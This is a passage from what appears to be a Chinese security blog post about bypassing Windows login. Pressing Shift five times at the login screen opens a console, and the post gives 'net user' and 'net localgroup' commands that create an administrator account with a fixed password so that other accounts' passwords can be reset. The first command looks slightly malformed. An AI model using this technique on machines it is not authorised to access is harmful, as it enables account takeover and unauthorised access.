<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/1611913765668-b92d058c-845d-42fa-b7f0-8efba91244ae.png" alt="image.png"></p>
<h4 id="重启进入系统"><a href="#重启进入系统" class="headerlink" title="重启进入系统"></a>重启进入系统</h4><p>按五次 Shift 触发：</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/1611913837521-2a955a9b-4756-49c5-bac8-40f67fe75711.png" alt="image.png"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">添加新用户</span></span><br><span class="line">net user add admin 123.abc /add</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">将新用户加入管理员组</span></span><br><span class="line">net localgroup administrators admin /add</span><br></pre></td></tr></table></figure>

<p>登录：</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/1611914309756-71f2bae5-0526-4ed4-96f7-c2c3f732275f.png" alt="image.png"></p>
<p>进入用户账户之后就可以随意修改密码了：</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/1611914382965-0ed0246e-a73d-43d6-99a2-20b61df6328f.png" alt="image.png"></p>
]]></content>
      <categories>
        <category>Security</category>
      </categories>
  </entry>
</search>
